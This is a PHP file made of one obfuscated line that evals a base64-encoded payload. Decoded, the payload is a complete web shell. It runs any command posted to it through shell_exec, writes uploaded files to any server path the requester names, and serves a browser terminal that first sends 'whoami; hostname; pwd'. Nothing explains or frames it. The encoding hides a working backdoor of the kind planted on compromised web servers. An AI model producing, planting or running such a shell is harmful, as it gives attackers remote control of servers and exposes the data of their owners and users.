<?php eval("?>".base64_decode("PD9waHANCmlmIChJU1NFVCgkX1BPU1RbJ2NtZCddKSkgew0KICAgICRvdXRwdXQgPSBwcmVnX3NwbGl0KCcvW25dLycsIHNoZWxsX2V4ZWMoJF9QT1NUWydjbWQnXS4iIDI+JjEiKSk7DQogICAgZm9yZWFjaCAoJG91dHB1dCBhcyAkbGluZSkgew0KICAgICAgICBlY2hvIGh0bWxlbnRpdGllcygkbGluZSwgRU5UX1FVT1RFUyB8IEVOVF9IVE1MNSwgJ1VURi04JykgLiAiPGJyPiI7DQogICAgfQ0KICAgIGRpZSgpOyANCn0gZWxzZSBpZiAoIWVtcHR5KCRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXSkgJiYgIWVtcHR5KCRfUE9TVFsncGF0aCddKSkgew0KICAgICRmaWxlbmFtZSA9ICRfRklMRVNbImZpbGUiXVsibmFtZSJdOw0KICAgICRwYXRoID0gJF9QT1NUWydwYXRoJ107DQogICAgaWYgKCRwYXRoICE9ICIvIikgew0KICAgICAgICAkcGF0aCAuPSAiLyI7DQogICAgfSANCiAgICBpZiAobW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbImZpbGUiXVsidG1wX25hbWUiXSwgJHBhdGguJGZpbGVuYW1lKSkgew0KICAgICAgICBlY2hvIGh0bWxlbnRpdGllcygkZmlsZW5hbWUpIC4gIiBzdWNjZXNzZnVsbHkgdXBsb2FkZWQgdG8gIiAuIGh0bWxlbnRpdGllcygkcGF0aCk7DQogICAgfSBlbHNlIHsNCiAgICAgICAgZWNobyAiRXJyb3IgdXBsb2FkaW5nICIgLiBodG1sZW50aXRpZXMoJGZpbGVuYW1lKTsNCiAgICB9DQogICAgZGllKCk7DQp9DQo/Pg0KDQo8aHRtbD4NCiAgICA8aGVhZD4NCiAgICAgICAgPHRpdGxlPjwvdGl0bGU+DQogICAgICAgIDxzdHlsZT4NCiAgICAgICAgICAgIGh0bWwsIGJvZHkgew0KICAgICAgICAgICAgICAgIG1heC13aWR0aDogMTAwJTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgDQogICAgICAgICAgICBib2R5IHsNCiAgICAgICAgICAgICAgICB3aWR0aDogMTAwJTsNCiAgICAgICAgICAgICAgICBoZWlnaHQ6IDEwMCU7DQogICAgICAgICAgICAgICAgbWFyZ2luOiAwOw0KICAgICAgICAgICAgICAgIGJhY2tncm91bmQ6ICMwMDA7DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIGJvZHksIC5pbnB1dHRleHQgew0KICAgICAgICAgICAgICAgIGZvbnQtZmFtaWx5OiAiTHVjaWRhIENvbnNvbGUiLCAiTHVjaWRhIFNhbnMgVHlwZXdyaXRlciIsIG1vbmFjbywgIkJpdHN0cmVhbSBWZXJhIFNhbnMgTW9ubyIsIG1vbm9zcGFjZTsNCiAgICAgICAgICAgICAgICBmb250LXNpemU6IDE0cHg7DQogICAgICAgICAgICAgICAgZm9udC1zdHlsZTogbm9ybWFsOw0KICAgICAgICAgICAgICAgIGZvbnQtdmFyaWFudDogbm9ybWFsOw0KICAgICAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiA0MDA7DQogICAgICAgICAgICAgICAgbGluZS1oZWlnaHQ6IDIwcHg7DQogICAgICAgICAgICAgICAgb3ZlcmZsb3c6IGhpZGRlbjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgDQogICAgICAgICAgICAuY29uc29sZSB7DQogICAgICAgICAgICAgICAgd2lkdGg6IDEwMCU7DQogICAgICAgICAgICAgICAgaGVpZ2h0OiAxMDAlOw0KICAgICAgICAgICAgICAgIG1hcmdpbjogYXV0bzsNCiAgICAgICAgICAgICAgICBwb3NpdGlvbjogYWJzb2x1dGU7DQogICAgICAgICAgICAgICAgY29sb3I6ICNmZmY7DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIC5vdXRwdXQgew0KICAgICAgICAgICAgICAgIHdpZHRoOiBhdXRvOw0KICAgICAgICAgICAgICAgIGhlaWdodDogYXV0bzsNCiAgICAgICAgICAgICAgICBwb3NpdGlvbjogYWJzb2x1dGU7DQogICAgICAgICAgICAgICAgb3ZlcmZsb3cteTogc2Nyb2xsOw0KICAgICAgICAgICAgICAgIHRvcDogMDsNCiAgICAgICAgICAgICAgICBib3R0b206IDMwcHg7DQogICAgICAgICAgICAgICAgbGVmdDogNXB4Ow0KICAgICAgICAgICAgICAgIHJpZ2h0OiAwOw0KICAgICAgICAgICAgICAgIGxpbmUtaGVpZ2h0OiAyMHB4Ow0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAuaW5wdXQgZm9ybSB7DQogICAgICAgICAgICAgICAgcG9zaXRpb246IHJlbGF0aXZlOw0KICAgICAgICAgICAgICAgIG1hcmdpbi1ib3R0b206IDBweDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgLnVzZXJuYW1lIHsNCiAgICAgICAgICAgICAgICBoZWlnaHQ6IDMwcHg7DQogICAgICAgICAgICAgICAgd2lkdGg6IGF1dG87DQogICAgICAgICAgICAgICAgcGFkZGluZy1sZWZ0OiA1cHg7DQogICAgICAgICAgICAgICAgbGluZS1oZWlnaHQ6IDMwcHg7DQogICAgICAgICAgICAgICAgZmxvYXQ6IGxlZnQ7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC5pbnB1dCB7DQogICAgICAgICAgICAgICAgYm9yZGVyLXRvcDogMXB4IHNvbGlkICMzMzMzMzM7DQogICAgICAgICAgICAgICAgd2lkdGg6IDEwMCU7DQogICAgICAgICAgICAgICAgaGVpZ2h0OiAzMHB4Ow0KICAgICAgICAgICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsNCiAgICAgICAgICAgICAgICBib3R0b206IDA7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC5pbnB1dHRleHQgew0KICAgICAgICAgICAgICAgIHdpZHRoOiBhdXRvOw0KICAgICAgICAgICAgICAgIGhlaWdodDogMzBweDsNCiAgICAgICAgICAgICAgICBib3R0b206IDBweDsNCiAgICAgICAgICAgICAgICBtYXJnaW4tYm90dG9tOiAwcHg7DQogICAgICAgICAgICAgICAgYmFja2dyb3VuZDogIzAwMDsNCiAgICAgICAgICAgICAgICBib3JkZXI6IDA7DQogICAgICAgICAgICAgICAgZmxvYXQ6IGxlZnQ7DQogICAgICAgICAgICAgICAgcGFkZGluZy1sZWZ0OiA4cHg7DQogICAgICAgICAgICAgICAgY29sb3I6ICNmZmY7DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIC5pbnB1dHRleHQ6Zm9jdXMgew0KICAgICAgICAgICAgICAgIG91dGxpbmU6IG5vbmU7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIDo6LXdlYmtpdC1zY3JvbGxiYXIgew0KICAgICAgICAgICAgICAgIHdpZHRoOiAxMnB4Ow0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICA6Oi13ZWJraXQtc2Nyb2xsYmFyLXRyYWNrIHsNCiAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kOiAjMTAxMDEwOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICA6Oi13ZWJraXQtc2Nyb2xsYmFyLXRodW1iIHsNCiAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kOiAjMzAzMDMwOyANCiAgICAgICAgICAgIH0NCiAgICAgICAgPC9zdHlsZT4NCiAgICA8L2hlYWQ+DQogICAgPGJvZHk+DQogICAgICAgIDxkaXYgY2xhc3M9ImNvbnNvbGUiPg0KICAgICAgICAgICAgPGRpdiBjbGFzcz0ib3V0cHV0IiBpZD0ib3V0cHV0Ij48L2Rpdj4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImlucHV0IiBpZD0iaW5wdXQiPg0KICAgICAgICAgICAgICAgIDxmb3JtIGlkPSJmb3JtIiBtZXRob2Q9IkdFVCIgb25TdWJtaXQ9InNlbmRDb21tYW5kKCkiPg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJ1c2VybmFtZSIgaWQ9InVzZXJuYW1lIj48L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgPGlucHV0IGNsYXNzPSJpbnB1dHRleHQiIGlkPSJpbnB1dHRleHQiIHR5cGU9InRleHQiIG5hbWU9ImNtZCIgYXV0b2NvbXBsZXRlPSJvZmYiIGF1dG9mb2N1cz4NCiAgICAgICAgICAgICAgICA8L2Zvcm0+DQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgPC9kaXY+DQogICAgICAgIDxmb3JtIGlkPSJ1cGxvYWQiIG1ldGhvZD0iUE9TVCIgc3R5bGU9ImRpc3BsYXk6IG5vbmU7Ij4NCiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlIiBpZD0iZmlsZWJyb3dzZXIiIG9uY2hhbmdlPSd1cGxvYWRGaWxlKCknIC8+DQogICAgICAgIDwvZm9ybT4NCiAgICAgICAgPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KICAgICAgICAgICAgdmFyIHVzZXJuYW1lID0gIiI7DQogICAgICAgICAgICB2YXIgaG9zdG5hbWUgPSAiIjsNCiAgICAgICAgICAgIHZhciBjdXJyZW50RGlyID0gIiI7DQogICAgICAgICAgICB2YXIgcHJldmlvdXNEaXIgPSAiIjsNCiAgICAgICAgICAgIHZhciBkZWZhdWx0RGlyID0gIiI7DQogICAgICAgICAgICB2YXIgY29tbWFuZEhpc3RvcnkgPSBbXTsNCiAgICAgICAgICAgIHZhciBjdXJyZW50Q29tbWFuZCA9IDA7DQogICAgICAgICAgICB2YXIgaW5wdXRUZXh0RWxlbWVudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpbnB1dHRleHQnKTsNCiAgICAgICAgICAgIHZhciBpbnB1dEVsZW1lbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiaW5wdXQiKTsNCiAgICAgICAgICAgIHZhciBvdXRwdXRFbGVtZW50ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIm91dHB1dCIpOw0KICAgICAgICAgICAgdmFyIHVzZXJuYW1lRWxlbWVudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ1c2VybmFtZSIpOw0KICAgICAgICAgICAgdmFyIHVwbG9hZEZvcm1FbGVtZW50ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInVwbG9hZCIpOw0KICAgICAgICAgICAgdmFyIGZpbGVCcm93c2VyRWxlbWVudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJmaWxlYnJvd3NlciIpOw0KICAgICAgICAgICAgZ2V0U2hlbGxJbmZvKCk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGZ1bmN0aW9uIGdldFNoZWxsSW5mbygpIHsNCiAgICAgICAgICAgICAgICB2YXIgcmVxdWVzdCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHJlcXVlc3Qub25yZWFkeXN0YXRlY2hhbmdlID0gZnVuY3Rpb24oKSB7DQogICAgICAgICAgICAgICAgICAgIGlmIChyZXF1ZXN0LnJlYWR5U3RhdGUgPT0gWE1MSHR0cFJlcXVlc3QuRE9ORSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHBhcnNlZFJlc3BvbnNlID0gcmVxdWVzdC5yZXNwb25zZVRleHQuc3BsaXQoIjxicj4iKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJuYW1lID0gcGFyc2VkUmVzcG9uc2VbMF07DQogICAgICAgICAgICAgICAgICAgICAgICBob3N0bmFtZSA9IHBhcnNlZFJlc3BvbnNlWzFdOw0KICAgICAgICAgICAgICAgICAgICAgICAgY3VycmVudERpciA9ICBwYXJzZWRSZXNwb25zZVsyXS5yZXBsYWNlKG5ldyBSZWdFeHAoIiZzb2w7IiwgImciKSwgIi8iKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGRlZmF1bHREaXIgPSBjdXJyZW50RGlyOw0KICAgICAgICAgICAgICAgICAgICAgICAgdXNlcm5hbWVFbGVtZW50LmlubmVySFRNTCA9ICI8ZGl2IHN0eWxlPSdjb2xvcjogI2ZmMDAwMDsgZGlzcGxheTogaW5saW5lOyc+Iit1c2VybmFtZSsiQCIraG9zdG5hbWUrIjwvZGl2PjoiK2N1cnJlbnREaXIrIiMiOw0KICAgICAgICAgICAgICAgICAgICAgICAgdXBkYXRlSW5wdXRXaWR0aCgpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfTsNCg0KICAgICAgICAgICAgICAgIHJlcXVlc3Qub3BlbigiUE9TVCIsICIiLCB0cnVlKTsNCiAgICAgICAgICAgICAgICByZXF1ZXN0LnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKTsNCiAgICAgICAgICAgICAgICByZXF1ZXN0LnNlbmQoImNtZD13aG9hbWk7IGhvc3RuYW1lOyBwd2QiKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgZnVuY3Rpb24gc2VuZENvbW1hbmQoKSB7DQogICAgICAgICAgICAgICAgdmFyIHJlcXVlc3QgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsNCiAgICAgICAgICAgICAgICB2YXIgY29tbWFuZCA9IGlucHV0VGV4dEVsZW1lbnQudmFsdWU7DQogICAgICAgICAgICAgICAgdmFyIG9yaWdpbmFsQ29tbWFuZCA9IGNvbW1hbmQ7DQogICAgICAgICAgICAgICAgdmFyIG9yaWdpbmFsRGlyID0gY3VycmVudERpcjsNCiAgICAgICAgICAgICAgICB2YXIgY2QgPSBmYWxzZTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBjb21tYW5kSGlzdG9yeS5wdXNoKG9yaWdpbmFsQ29tbWFuZCk7DQogICAgICAgICAgICAgICAgc3dpdGNoQ29tbWFuZChjb21tYW5kSGlzdG9yeS5sZW5ndGgpOw0KICAgICAgICAgICAgICAgIGlucHV0VGV4dEVsZW1lbnQudmFsdWUgPSAiIjsNCg0KICAgICAgICAgICAgICAgIHZhciBwYXJzZWRDb21tYW5kID0gY29tbWFuZC5zcGxpdCgiICIpOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGlmIChwYXJzZWRDb21tYW5kWzBdID09ICJjZCIpIHsNCiAgICAgICAgICAgICAgICAgICAgY2QgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICBpZiAocGFyc2VkQ29tbWFuZC5sZW5ndGggPT0gMSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZCA9ICJjZCAiK2RlZmF1bHREaXIrIjsgcHdkIjsNCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmIChwYXJzZWRDb21tYW5kWzFdID09ICItIikgew0KICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZCA9ICJjZCAiK3ByZXZpb3VzRGlyKyI7IHB3ZCI7DQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gImNkICIrY3VycmVudERpcisiOyAiK2NvbW1hbmQrIjsgcHdkIjsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKHBhcnNlZENvbW1hbmRbMF0gPT0gImNsZWFyIikgew0KICAgICAgICAgICAgICAgICAgICBvdXRwdXRFbGVtZW50LmlubmVySFRNTCA9ICIiOw0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgfSBlbHNlIGlmIChwYXJzZWRDb21tYW5kWzBdID09ICJ1cGxvYWQiKSB7DQogICAgICAgICAgICAgICAgICAgIGZpbGVCcm93c2VyRWxlbWVudC5jbGljaygpOw0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgY29tbWFuZCA9ICJjZCAiK2N1cnJlbnREaXIrIjsgIiArIGNvbW1hbmQ7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHJlcXVlc3Qub25yZWFkeXN0YXRlY2hhbmdlID0gZnVuY3Rpb24oKSB7DQogICAgICAgICAgICAgICAgICAgIGlmIChyZXF1ZXN0LnJlYWR5U3RhdGUgPT0gWE1MSHR0cFJlcXVlc3QuRE9ORSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNkKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHBhcnNlZFJlc3BvbnNlID0gcmVxdWVzdC5yZXNwb25zZVRleHQuc3BsaXQoIjxicj4iKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmV2aW91c0RpciA9IGN1cnJlbnREaXI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY3VycmVudERpciA9IHBhcnNlZFJlc3BvbnNlWzBdLnJlcGxhY2UobmV3IFJlZ0V4cCgiJnNvbDsiLCAiZyIpLCAiLyIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG91dHB1dEVsZW1lbnQuaW5uZXJIVE1MICs9ICI8ZGl2IHN0eWxlPSdjb2xvcjojZmYwMDAwOyBmbG9hdDogbGVmdDsnPiIrdXNlcm5hbWUrIkAiK2hvc3RuYW1lKyI8L2Rpdj48ZGl2IHN0eWxlPSdmbG9hdDogbGVmdDsnPiIrIjoiK29yaWdpbmFsRGlyKyIjICIrb3JpZ2luYWxDb21tYW5kKyI8L2Rpdj48YnI+IjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZUVsZW1lbnQuaW5uZXJIVE1MID0gIjxkaXYgc3R5bGU9J2NvbG9yOiAjZmYwMDAwOyBkaXNwbGF5OiBpbmxpbmU7Jz4iK3VzZXJuYW1lKyJAIitob3N0bmFtZSsiPC9kaXY+OiIrY3VycmVudERpcisiIyI7DQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG91dHB1dEVsZW1lbnQuaW5uZXJIVE1MICs9ICI8ZGl2IHN0eWxlPSdjb2xvcjojZmYwMDAwOyBmbG9hdDogbGVmdDsnPiIrdXNlcm5hbWUrIkAiK2hvc3RuYW1lKyI8L2Rpdj48ZGl2IHN0eWxlPSdmbG9hdDogbGVmdDsnPiIrIjoiK2N1cnJlbnREaXIrIiMgIitvcmlnaW5hbENvbW1hbmQrIjwvZGl2Pjxicj4iICsgcmVxdWVzdC5yZXNwb25zZVRleHQucmVwbGFjZShuZXcgUmVnRXhwKCI8YnI+PGJyPiQiKSwgIjxicj4iKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvdXRwdXRFbGVtZW50LnNjcm9sbFRvcCA9IG91dHB1dEVsZW1lbnQuc2Nyb2xsSGVpZ2h0Ow0KICAgICAgICAgICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICAgICAgICAgIHVwZGF0ZUlucHV0V2lkdGgoKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH07DQoNCiAgICAgICAgICAgICAgICByZXF1ZXN0Lm9wZW4oIlBPU1QiLCAiIiwgdHJ1ZSk7DQogICAgICAgICAgICAgICAgcmVxdWVzdC5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LXR5cGUiLCAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIik7DQogICAgICAgICAgICAgICAgcmVxdWVzdC5zZW5kKCJjbWQ9IitlbmNvZGVVUklDb21wb25lbnQoY29tbWFuZCkpOw0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgZnVuY3Rpb24gdXBsb2FkRmlsZSgpIHsNCiAgICAgICAgICAgICAgICB2YXIgZm9ybURhdGEgPSBuZXcgRm9ybURhdGEoKTsNCiAgICAgICAgICAgICAgICBmb3JtRGF0YS5hcHBlbmQoJ2ZpbGUnLCBmaWxlQnJvd3NlckVsZW1lbnQuZmlsZXNbMF0sIGZpbGVCcm93c2VyRWxlbWVudC5maWxlc1swXS5uYW1lKTsNCiAgICAgICAgICAgICAgICBmb3JtRGF0YS5hcHBlbmQoJ3BhdGgnLCBjdXJyZW50RGlyKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICB2YXIgcmVxdWVzdCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHJlcXVlc3Qub25yZWFkeXN0YXRlY2hhbmdlID0gZnVuY3Rpb24oKSB7DQogICAgICAgICAgICAgICAgICAgIGlmIChyZXF1ZXN0LnJlYWR5U3RhdGUgPT0gWE1MSHR0cFJlcXVlc3QuRE9ORSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgb3V0cHV0RWxlbWVudC5pbm5lckhUTUwgKz0gcmVxdWVzdC5yZXNwb25zZVRleHQrIjxicj4iOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfTsNCg0KICAgICAgICAgICAgICAgIHJlcXVlc3Qub3BlbigiUE9TVCIsICIiLCB0cnVlKTsNCiAgICAgICAgICAgICAgICByZXF1ZXN0LnNlbmQoZm9ybURhdGEpOw0KICAgICAgICAgICAgICAgIG91dHB1dEVsZW1lbnQuaW5uZXJIVE1MICs9ICI8ZGl2IHN0eWxlPSdjb2xvcjojZmYwMDAwOyBmbG9hdDogbGVmdDsnPiIrdXNlcm5hbWUrIkAiK2hvc3RuYW1lKyI8L2Rpdj48ZGl2IHN0eWxlPSdmbG9hdDogbGVmdDsnPiIrIjoiK2N1cnJlbnREaXIrIiMgVXBsb2FkaW5nICIrZmlsZUJyb3dzZXJFbGVtZW50LmZpbGVzWzBdLm5hbWUrIi4uLjwvZGl2Pjxicj4iOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBmdW5jdGlvbiB1cGRhdGVJbnB1dFdpZHRoKCkgew0KICAgICAgICAgICAgICAgIGlucHV0VGV4dEVsZW1lbnQuc3R5bGUud2lkdGggPSBpbnB1dEVsZW1lbnQuY2xpZW50V2lkdGggLSB1c2VybmFtZUVsZW1lbnQuY2xpZW50V2lkdGggLSAxNTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgZG9jdW1lbnQub25rZXlkb3duID0gY2hlY2tGb3JBcnJvd0tleXM7DQoNCiAgICAgICAgICAgIGZ1bmN0aW9uIGNoZWNrRm9yQXJyb3dLZXlzKGUpIHsNCiAgICAgICAgICAgICAgICBlID0gZSB8fCB3aW5kb3cuZXZlbnQ7DQoNCiAgICAgICAgICAgICAgICBpZiAoZS5rZXlDb2RlID09ICczOCcpIHsNCiAgICAgICAgICAgICAgICAgICAgcHJldmlvdXNDb21tYW5kKCk7DQogICAgICAgICAgICAgICAgfSBlbHNlIGlmIChlLmtleUNvZGUgPT0gJzQwJykgew0KICAgICAgICAgICAgICAgICAgICBuZXh0Q29tbWFuZCgpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgZnVuY3Rpb24gcHJldmlvdXNDb21tYW5kKCkgew0KICAgICAgICAgICAgICAgIGlmIChjdXJyZW50Q29tbWFuZCAhPSAwKSB7DQogICAgICAgICAgICAgICAgICAgIHN3aXRjaENvbW1hbmQoY3VycmVudENvbW1hbmQtMSk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBmdW5jdGlvbiBuZXh0Q29tbWFuZCgpIHsNCiAgICAgICAgICAgICAgICBpZiAoY3VycmVudENvbW1hbmQgIT0gY29tbWFuZEhpc3RvcnkubGVuZ3RoKSB7DQogICAgICAgICAgICAgICAgICAgIHN3aXRjaENvbW1hbmQoY3VycmVudENvbW1hbmQrMSk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBmdW5jdGlvbiBzd2l0Y2hDb21tYW5kKG5ld0NvbW1hbmQpIHsNCiAgICAgICAgICAgICAgICBjdXJyZW50Q29tbWFuZCA9IG5ld0NvbW1hbmQ7DQoNCiAgICAgICAgICAgICAgICBpZiAoY3VycmVudENvbW1hbmQgPT0gY29tbWFuZEhpc3RvcnkubGVuZ3RoKSB7DQogICAgICAgICAgICAgICAgICAgIGlucHV0VGV4dEVsZW1lbnQudmFsdWUgPSAiIjsNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICBpbnB1dFRleHRFbGVtZW50LnZhbHVlID0gY29tbWFuZEhpc3RvcnlbY3VycmVudENvbW1hbmRdOw0KICAgICAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7IGlucHV0VGV4dEVsZW1lbnQuc2VsZWN0aW9uU3RhcnQgPSBpbnB1dFRleHRFbGVtZW50LnNlbGVjdGlvbkVuZCA9IDEwMDAwOyB9LCAwKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJmb3JtIikuYWRkRXZlbnRMaXN0ZW5lcigic3VibWl0IiwgZnVuY3Rpb24oZXZlbnQpew0KICAgICAgICAgICAgICAgIGV2ZW50LnByZXZlbnREZWZhdWx0KCkNCiAgICAgICAgICAgIH0pOw0KICAgICAgICA8L3NjcmlwdD4NCiAgICA8L2JvZHk+DQo8L2h0bWw+DQo=")); ?>
